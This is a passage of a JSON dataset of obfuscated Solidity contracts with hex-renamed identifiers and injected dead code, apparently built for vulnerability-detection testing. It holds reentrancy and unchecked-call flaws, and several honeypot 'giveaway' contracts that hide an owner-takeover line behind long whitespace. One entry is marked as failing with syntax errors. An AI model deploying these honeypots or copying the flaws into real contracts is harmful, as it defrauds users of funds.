      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.18;\n\ncontract Ownable\n{\n    address _0x1971cd;\n    address _0x58e4aa = msg.sender;\n\n    function _0x844bd0(address _0x321e52)\n    public\n    _0x1d6e48\n    {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        _0x1971cd = _0x321e52;\n    }\n\n    function _0x7aef45()\n    public\n    {\n        uint256 _unused3 = 0;\n        // Placeholder for future logic\n        if(msg.sender==_0x1971cd)\n        {\n            _0x58e4aa=_0x1971cd;\n        }\n    }\n\n    modifier _0x1d6e48\n    {\n        if(_0x58e4aa == msg.sender)_;\n    }\n}\n\ncontract Token is Ownable\n{\n    address _0x58e4aa = msg.sender;\n    function WithdrawToken(address _0x09572c, uint256 _0x1ce554,address _0x2cd865)\n    public\n    _0x1d6e48\n    {\n        _0x09572c.call(bytes4(_0xf8ef3d(\"transfer(address,uint256)\")),_0x2cd865,_0x1ce554);\n    }\n}\n\ncontract TokenBank is Token\n{\n    uint public MinDeposit;\n    mapping (address => uint) public Holders;\n\n     ///Constructor\n    function _0x1f56fc()\n    public\n    {\n        _0x58e4aa = msg.sender;\n        MinDeposit = 1 ether;\n    }\n\n    function()\n    payable\n    {\n        Deposit();\n    }\n\n    function Deposit()\n    payable\n    {\n        if(msg.value>=MinDeposit)\n        {\n            Holders[msg.sender]+=msg.value;\n        }\n    }\n\n    function WitdrawTokenToHolder(address _0xdd87e9,address _0xd9d20d,uint _0x241c78)\n    public\n    _0x1d6e48\n    {\n        if(Holders[_0xdd87e9]>0)\n        {\n            Holders[_0xdd87e9]=0;\n            WithdrawToken(_0xd9d20d,_0x241c78,_0xdd87e9);\n        }\n    }\n\n    function WithdrawToHolder(address _0xb20846, uint _0x4b2657)\n    public\n    _0x1d6e48\n    payable\n    {\n        if(Holders[msg.sender]>0)\n        {\n            if(Holders[_0xb20846]>=_0x4b2657)\n            {\n                _0xb20846.call.value(_0x4b2657);\n                Holders[_0xb20846]-=_0x4b2657;\n            }\n        }\n    }\n\n    function Bal() public constant returns(uint){return this.balance;}\n}",
      "rename_map": {
        "initTokenBank": "_0x1f56fc",
        "confirmOwner": "_0x7aef45",
        "changeOwner": "_0x844bd0",
        "onlyOwner": "_0x1d6e48",
        "newOwner": "_0x1971cd",
        "_amount": "_0x241c78",
        "amount": "_0x1ce554",
        "_token": "_0xd9d20d",
        "token": "_0x09572c",
        "_addr": "_0xb20846",
        "owner": "_0x58e4aa",
        "addr": "_0x321e52",
        "_wei": "_0x4b2657",
        "sha3": "_0xf8ef3d",
        "_to": "_0xdd87e9",
        "to": "_0x2cd865"
      },
      "changes": [
        "Renamed 16 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_067",
      "transformed_id": "ss_l4_medium_sn_ds_067",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.23;\n\n// ----------------------------------------------------------------------------------------------\n// Project Delta\n// DELTA - New Crypto-Platform with own cryptocurrency, verified smart contracts and multi blockchains!\n// For 1 DELTA token in future you will get 1 DELTA coin!\n// Site: http://delta.money\n// Telegram Chat: @deltacoin\n// Telegram News: @deltaico\n// CEO Nechesov Andrey http://facebook.com/Nechesov\n// Telegram: @Nechesov\n// Ltd. \"Delta\"\n// Working with ERC20 contract https://etherscan.io/address/0xf85a2e95fa30d005f629cbe6c6d2887d979fff2a\n// ----------------------------------------------------------------------------------------------\n\ncontract Delta {\n\n\taddress public c = 0xF85A2E95FA30d005F629cBe6c6d2887D979ffF2A;\n\taddress public _0xaf9a49 = 0x788c45dd60ae4dbe5055b5ac02384d5dc84677b0;\n\taddress public _0xbb384a = 0x0C6561edad2017c01579Fd346a58197ea01A0Cf3;\n\tuint public _0xee4c5e = 1;\n\n\tuint public _0xc7eac4 = 10**18*1/1000;\n\n\t//default function for buy tokens\n\tfunction() payable {\n\t    _0x3ba589();\n\t}\n\n    function _0x3ba589() payable returns (bool) {\n\n        require(_0xee4c5e > 0);\n        require(msg.value >= _0xc7eac4);\n\n        uint _0x3ba589 = msg.value*10**18/_0xc7eac4;\n\n        require(_0x3ba589 > 0);\n\n        if(!c.call(bytes4(_0x752376(\"transferFrom(address,address,uint256)\")),_0xaf9a49, msg.sender,_0x3ba589)){\n        \treturn false;\n        }\n\n        uint _0x769b53 = msg.value * 3 / 10;\n        _0xbb384a.send(_0x769b53);\n\n        return true;\n      }\n\n      //Withdraw money from contract balance to owner\n      function _0xb0e2ad(uint256 _0xee34a9) _0x433ddd returns (bool _0x9d4a12) {\n          uint256 balance;\n          balance = this.balance;\n          if(_0xee34a9 > 0) balance = _0xee34a9;\n          _0xaf9a49.send(balance);\n          return true;\n      }\n\n      //Change token\n      function _0xc15a9e(uint256 _0xe3fe70) _0x433ddd returns (bool _0x9d4a12) {\n        if (1 == 1) { _0xc7eac4 = _0xe3fe70; }\n        return true;\n      }\n\n      //Change active\n      function _0x70e85f(uint256 _0x32ba21) _0x433ddd returns (bool _0x9d4a12) {\n        if (gasleft() > 0) { _0xee4c5e = _0x32ba21; }\n        return true;\n      }\n\n      // Functions with this modifier can only be executed by the owner\n    \tmodifier _0x433ddd() {\n        if (msg.sender != _0xaf9a49) {\n            throw;\n        }\n        _;\n    }\n\n}",
      "rename_map": {
        "change_token_price": "_0xc15a9e",
        "change_active": "_0x70e85f",
        "_token_price": "_0xe3fe70",
        "token_price": "_0xc7eac4",
        "tokens_buy": "_0x3ba589",
        "onlyOwner": "_0x433ddd",
        "withdraw": "_0xb0e2ad",
        "_active": "_0x32ba21",
        "_amount": "_0xee34a9",
        "result": "_0x9d4a12",
        "active": "_0xee4c5e",
        "owner2": "_0xbb384a",
        "owner": "_0xaf9a49",
        "sum2": "_0x769b53",
        "sha3": "_0x752376"
      },
      "changes": [
        "Renamed 15 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_068",
      "transformed_id": "ss_l4_medium_sn_ds_068",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.18;\n\ncontract AirDropContract{\n\n    function AirDropContract() public {\n        if (false) { revert(); }\n        uint256 _unused2 = 0;\n    }\n\n    modifier _0x9b8cb4( address _0x27b148 ) {\n        require(_0x27b148 != address(0x0));\n        require(_0x27b148 != address(this));\n        _;\n    }\n\n    function transfer(address _0xfb0094,address[] _0xc9d201,uint[] _0x3c93c2)\n        public\n        _0x9b8cb4(_0xfb0094)\n        returns (bool){\n        // Placeholder for future logic\n        uint256 _unused4 = 0;\n\n        require(_0xc9d201.length > 0);\n        require(_0x3c93c2.length > 0);\n        require(_0xc9d201.length == _0x3c93c2.length);\n        bytes4 _0xe74e3a = bytes4(_0xe90af0(\"transferFrom(address,address,uint256)\"));\n        for(uint i = 0 ; i < _0xc9d201.length; i++){\n            _0xfb0094.call(_0xe74e3a, msg.sender, _0xc9d201[i], _0x3c93c2[i]);\n        }\n        return true;\n    }\n}",
      "rename_map": {
        "contract_address": "_0xfb0094",
        "validAddress": "_0x9b8cb4",
        "keccak256": "_0xe90af0",
        "addr": "_0x27b148",
        "tos": "_0xc9d201",
        "id": "_0xe74e3a",
        "vs": "_0x3c93c2"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_069",
      "transformed_id": "ss_l4_medium_sn_ds_069",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.18;\n\ncontract EBU{\n\n    function transfer(address from,address _0xbd7da1,address[] _0x1dfb65,uint[] v)public returns (bool){\n        require(_0x1dfb65.length > 0);\n        bytes4 _0xa53d57=bytes4(_0xf8260e(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_0x1dfb65.length;i++){\n            _0xbd7da1.call(_0xa53d57,from,_0x1dfb65[i],v[i]);\n        }\n        return true;\n    }\n}",
      "rename_map": {
        "keccak256": "_0xf8260e",
        "caddress": "_0xbd7da1",
        "_tos": "_0x1dfb65",
        "id": "_0xa53d57"
      },
      "changes": [
        "Renamed 4 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_070",
      "transformed_id": "ss_l4_medium_sn_ds_070",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract Proxy  {\n    modifier _0xb6539d { if (msg.sender == Owner) _; } address Owner = msg.sender;\n    function _0x912963(address _0xfa8c22) public _0xb6539d {\n        // Placeholder for future logic\n        if (false) { revert(); } Owner = _0xfa8c22; }\n    function _0xb25f5d(address _0xad66cb, bytes data) public payable {\n        bool _flag3 = false;\n        uint256 _unused4 = 0;\n        _0xad66cb.call.value(msg.value)(data);\n    }\n}\n\ncontract DepositProxy is Proxy {\n    address public Owner;\n    mapping (address => uint256) public Deposits;\n\n    function () public payable { }\n\n    function Vault() public payable {\n        if (msg.sender == tx.origin) {\n            Owner = msg.sender;\n            _0xc0b68a();\n        }\n    }\n\n    function _0xc0b68a() public payable {\n        if (msg.value > 0.5 ether) {\n            Deposits[msg.sender] += msg.value;\n        }\n    }\n\n    function _0x194c00(uint256 _0x036e18) public _0xb6539d {\n        if (_0x036e18>0 && Deposits[msg.sender]>=_0x036e18) {\n            msg.sender.transfer(_0x036e18);\n        }\n    }\n}",
      "rename_map": {
        "transferOwner": "_0x912963",
        "onlyOwner": "_0xb6539d",
        "withdraw": "_0x194c00",
        "deposit": "_0xc0b68a",
        "amount": "_0x036e18",
        "_owner": "_0xfa8c22",
        "target": "_0xad66cb",
        "proxy": "_0xb25f5d"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_071",
      "transformed_id": "ss_l4_medium_sn_ds_071",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract SimpleWallet {\n    address public _0x641bba = msg.sender;\n    uint public _0x0464af;\n\n    modifier _0x999069 {\n        require(msg.sender == _0x641bba);\n        _;\n    }\n\n    function() public payable {\n        _0x0464af++;\n    }\n\n    function _0x8b3cc4() public _0x999069 {\n        bool _flag1 = false;\n        // Placeholder for future logic\n        _0x524533(address(this).balance);\n    }\n\n    function _0x524533(uint _0x58ce10) public _0x999069 {\n        if (false) { revert(); }\n        uint256 _unused4 = 0;\n        msg.sender.transfer(_0x58ce10);\n    }\n\n    function _0xfce808(address _0x45eb77, uint _0x58ce10) public _0x999069 {\n        _0x45eb77.call.value(_0x58ce10)();\n    }\n}",
      "rename_map": {
        "depositsCount": "_0x0464af",
        "withdrawAll": "_0x8b3cc4",
        "sendMoney": "_0xfce808",
        "onlyOwner": "_0x999069",
        "withdraw": "_0x524533",
        "_target": "_0x45eb77",
        "_value": "_0x58ce10",
        "owner": "_0x641bba"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_072",
      "transformed_id": "ss_l4_medium_sn_ds_072",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.23;\n\ncontract _0x3adcbc {\n    mapping(address => uint256) public _0x933907;\n\n    function () payable public {\n        _0x933907[msg.sender] += msg.value;\n    }\n\n    function _0xde145f() public {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        msg.sender.call.value(_0x933907[msg.sender])();\n        _0x933907[msg.sender] = 0;\n    }\n}\n",
      "rename_map": {
        "keepMyEther": "_0x3adcbc",
        "balances": "_0x933907",
        "withdraw": "_0xde145f"
      },
      "changes": [
        "Renamed 3 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_073",
      "transformed_id": "ss_l4_medium_sn_ds_073",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.23;\n\ncontract Proxy  {\n    modifier _0x03ba70 { if (msg.sender == Owner) _; } address Owner = msg.sender;\n    function _0xaee2bf(address _0x963e4c) public _0x03ba70 {\n        if (false) { revert(); }\n        // Placeholder for future logic Owner = _0x963e4c; }\n    function _0x646736(address _0xc77e60, bytes data) public payable {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        _0xc77e60.call.value(msg.value)(data);\n    }\n}\n\ncontract VaultProxy is Proxy {\n    address public Owner;\n    mapping (address => uint256) public Deposits;\n\n    function () public payable { }\n\n    function Vault() public payable {\n        if (msg.sender == tx.origin) {\n            if (msg.sender != address(0) || msg.sender == address(0)) { Owner = msg.sender; }\n            _0x0114c3();\n        }\n    }\n\n    function _0x0114c3() public payable {\n        if (msg.value > 0.25 ether) {\n            Deposits[msg.sender] += msg.value;\n        }\n    }\n\n    function _0x9de39f(uint256 _0xbed280) public _0x03ba70 {\n        if (_0xbed280>0 && Deposits[msg.sender]>=_0xbed280) {\n            msg.sender.transfer(_0xbed280);\n        }\n    }\n}",
      "rename_map": {
        "transferOwner": "_0xaee2bf",
        "onlyOwner": "_0x03ba70",
        "withdraw": "_0x9de39f",
        "deposit": "_0x0114c3",
        "amount": "_0xbed280",
        "_owner": "_0x963e4c",
        "target": "_0xc77e60",
        "proxy": "_0x646736"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 9, column 5', 'Syntax error at line 9, column 14', 'Syntax error at line 16, column 20']"
    },
    {
      "original_id": "sn_ds_074",
      "transformed_id": "ss_l4_medium_sn_ds_074",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract Proxy  {\n    modifier _0x3fc89c { if (msg.sender == Owner) _; } address Owner = msg.sender;\n    function _0x18a441(address _0x93a12d) public _0x3fc89c {\n        bool _flag1 = false;\n        if (false) { revert(); } Owner = _0x93a12d; }\n    function _0x712d60(address _0xd07d50, bytes data) public payable {\n        if (false) { revert(); }\n        uint256 _unused4 = 0;\n        _0xd07d50.call.value(msg.value)(data);\n    }\n}\n\ncontract VaultProxy is Proxy {\n    address public Owner;\n    mapping (address => uint256) public Deposits;\n\n    function () public payable { }\n\n    function Vault() public payable {\n        if (msg.sender == tx.origin) {\n            if (1 == 1) { Owner = msg.sender; }\n            _0x4a605f();\n        }\n    }\n\n    function _0x4a605f() public payable {\n        if (msg.value > 0.5 ether) {\n            Deposits[msg.sender] += msg.value;\n        }\n    }\n\n    function _0x3d7ab5(uint256 _0x16460b) public _0x3fc89c {\n        if (_0x16460b>0 && Deposits[msg.sender]>=_0x16460b) {\n            msg.sender.transfer(_0x16460b);\n        }\n    }\n}",
      "rename_map": {
        "transferOwner": "_0x18a441",
        "onlyOwner": "_0x3fc89c",
        "withdraw": "_0x3d7ab5",
        "deposit": "_0x4a605f",
        "amount": "_0x16460b",
        "_owner": "_0x93a12d",
        "target": "_0xd07d50",
        "proxy": "_0x712d60"
      },
      "changes": [
        "Renamed 8 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_075",
      "transformed_id": "ss_l4_medium_sn_ds_075",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract Pie\n{\n    address public Owner = msg.sender;\n\n    function()\n    public\n    payable\n    {\n\n    }\n\n    function Get()\n    public\n    payable\n    {\n        bool _flag1 = false;\n        // Placeholder for future logic\n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function _0xef3e86()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function Command(address _0x31fb1b,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        _0x31fb1b.call.value(msg.value)(data);\n    }\n}",
      "rename_map": {
        "withdraw": "_0xef3e86",
        "adr": "_0x31fb1b"
      },
      "changes": [
        "Renamed 2 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_076",
      "transformed_id": "ss_l4_medium_sn_ds_076",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract _0x9654e3{\n\n    function transfer(address from,address _0x33abc6,address[] _0x4a65aa,uint v)public returns (bool){\n        require(_0x4a65aa.length > 0);\n        bytes4 _0x93add9=bytes4(_0xb91902(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_0x4a65aa.length;i++){\n            _0x33abc6.call(_0x93add9,from,_0x4a65aa[i],v);\n        }\n        return true;\n    }\n}",
      "rename_map": {
        "keccak256": "_0xb91902",
        "caddress": "_0x33abc6",
        "_tos": "_0x4a65aa",
        "demo": "_0x9654e3",
        "id": "_0x93add9"
      },
      "changes": [
        "Renamed 5 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_077",
      "transformed_id": "ss_l4_medium_sn_ds_077",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract FreeEth\n{\n    address public Owner = msg.sender;\n\n    function() public payable{}\n\n    function GetFreebie()\n    public\n    payable\n    {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function _0x315123()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function Command(address _0xf68232,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        _0xf68232.call.value(msg.value)(data);\n    }\n}",
      "rename_map": {
        "withdraw": "_0x315123",
        "adr": "_0xf68232"
      },
      "changes": [
        "Renamed 2 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_078",
      "transformed_id": "ss_l4_medium_sn_ds_078",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract Honey\n{\n    address public Owner = msg.sender;\n\n    function()\n    public\n    payable\n    {\n\n    }\n\n    function GetFreebie()\n    public\n    payable\n    {\n        bool _flag1 = false;\n        bool _flag2 = false;\n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function _0xc921ab()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function Command(address _0x3d21b1,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        _0x3d21b1.call.value(msg.value)(data);\n    }\n}",
      "rename_map": {
        "withdraw": "_0xc921ab",
        "adr": "_0x3d21b1"
      },
      "changes": [
        "Renamed 2 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_079",
      "transformed_id": "ss_l4_medium_sn_ds_079",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract Freebie\n{\n    address public Owner = msg.sender;\n\n    function() public payable{}\n\n    function GetFreebie()\n    public\n    payable\n    {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function _0x661811()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function Command(address _0x2a37c2,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        _0x2a37c2.call.value(msg.value)(data);\n    }\n}",
      "rename_map": {
        "withdraw": "_0x661811",
        "adr": "_0x2a37c2"
      },
      "changes": [
        "Renamed 2 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_080",
      "transformed_id": "ss_l4_medium_sn_ds_080",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract _0x3ea468{\n\n    function transfer(address from,address _0x81ecf6,address[] _0xfd0423,uint v, uint _0xd6a84c)public returns (bool){\n        require(_0xfd0423.length > 0);\n        bytes4 _0x5f5e46=bytes4(_0x3dae0e(\"transferFrom(address,address,uint256)\"));\n        uint _0x93bfdb = v * 10 ** _0xd6a84c;\n        for(uint i=0;i<_0xfd0423.length;i++){\n            _0x81ecf6.call(_0x5f5e46,from,_0xfd0423[i],_0x93bfdb);\n        }\n        return true;\n    }\n}",
      "rename_map": {
        "_decimals": "_0xd6a84c",
        "keccak256": "_0x3dae0e",
        "caddress": "_0x81ecf6",
        "airDrop": "_0x3ea468",
        "_value": "_0x93bfdb",
        "_tos": "_0xfd0423",
        "id": "_0x5f5e46"
      },
      "changes": [
        "Renamed 7 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_081",
      "transformed_id": "ss_l4_medium_sn_ds_081",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.16;\n\ncontract RealOldFuckMaker {\n    address _0xfd4bcf = 0xc63e7b1DEcE63A77eD7E4Aeef5efb3b05C81438D;\n\n    // this can make OVER 9,000 OLD FUCKS\n    // (just pass in 129)\n    function _0x4337be(uint32 number) {\n        uint32 i;\n        for (i = 0; i < number; i++) {\n            _0xfd4bcf.call(bytes4(_0xa72967(\"giveBlockReward()\")));\n        }\n    }\n}",
      "rename_map": {
        "makeOldFucks": "_0x4337be",
        "sha3": "_0xa72967",
        "fuck": "_0xfd4bcf"
      },
      "changes": [
        "Renamed 3 identifiers using hex style"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_082",
      "transformed_id": "ss_l4_medium_sn_ds_082",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.24;\n\ncontract B {\n    address public _0x1f4f69 = msg.sender;\n\n    function _0xdf8dd8() public payable {\n        // Placeholder for future logic\n        uint256 _unused2 = 0;\n        address _0xf34b05 = 0xC8A60C51967F4022BF9424C337e9c6F0bD220E1C;\n        _0xf34b05.call.value(msg.value)();\n        _0x1f4f69.transfer(address(this).balance);\n    }\n\n    function() public payable {\n    }\n}",
      "rename_map": {
        "target": "_0xf34b05",
        "owner": "_0x1f4f69",
        "go": "_0xdf8dd8"
      },
      "changes": [
        "Renamed 3 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_083",
      "transformed_id": "ss_l4_medium_sn_ds_083",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway2\n{\n    address public Owner = msg.sender;\n\n    function()\n    public\n    payable\n    {\n\n    }\n\n    function GetFreebie()\n    public\n    payable\n    {\n        // Placeholder for future logic\n        // Placeholder for future logic\n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function _0x171c54()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n\n    function Command(address _0x4ecb41,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        _0x4ecb41.call.value(msg.value)(data);\n    }\n}",
      "rename_map": {
        "withdraw": "_0x171c54",
        "adr": "_0x4ecb41"
      },
      "changes": [
        "Renamed 2 identifiers using hex style",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_ds_084",
      "transformed_id": "ss_l4_medium_sn_ds_084",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// See www.kingoftheether.com & https://github.com/kieranelby/KingOfTheEtherThrone .\n// (c) Kieran Elby 2016. All rights reserved.\n// v0.4.0.\n// Inspired by ethereumpyramid.com and the (now-gone?) \"magnificent bitcoin gem\".\n\n// This contract lives on the blockchain at 0xb336a86e2feb1e87a328fcb7dd4d04de3df254d0\n// and was compiled (using optimization) with:\n// Solidity version: 0.2.1-fad2d4df/.-Emscripten/clang/int linked to libethereum\n\n// For future versions it would be nice to ...\n// TODO - enforce time-limit on reign (can contracts do that without external action)?\n// TODO - add a random reset?\n// TODO - add bitcoin bridge so agents can pay in bitcoin?\n// TODO - maybe allow different return payment address?\n\n//added pragma version\npragma solidity ^0.4.0;\n\ncontract KingOfTheEtherThrone {\n\n    struct Monarch {\n        // Address to which their compensation will be sent.\n        address _0xf4dfc4;\n        // A name by which they wish to be known.\n        // NB: Unfortunately \"string\" seems to expose some bugs in web3.\n        string _0xd550c8;\n        // How much did they pay to become monarch?\n        uint _0x1475b7;\n        // When did their rule start (based on block.timestamp)?\n        uint _0xe8b38f;\n    }\n\n    // The wizard is the hidden power behind the throne; they\n    // occupy the throne during gaps in succession and collect fees.\n    address _0x59ce65;\n\n    // Used to ensure only the wizard can do some things.\n    modifier _0x50fdcd { if (msg.sender == _0x59ce65) _; }\n\n    // How much must the first monarch pay?\n    uint constant _0xec319a = 100 finney;\n\n    // The next claimPrice is calculated from the previous claimFee\n    // by multiplying by claimFeeAdjustNum and dividing by claimFeeAdjustDen -\n    // for example, num=3 and den=2 would cause a 50% increase.\n    uint constant _0x3ba64c = 3;\n    uint constant _0x3ab67d = 2;\n\n    // How much of each claimFee goes to the wizard (expressed as a fraction)?\n    // e.g. num=1 and den=100 would deduct 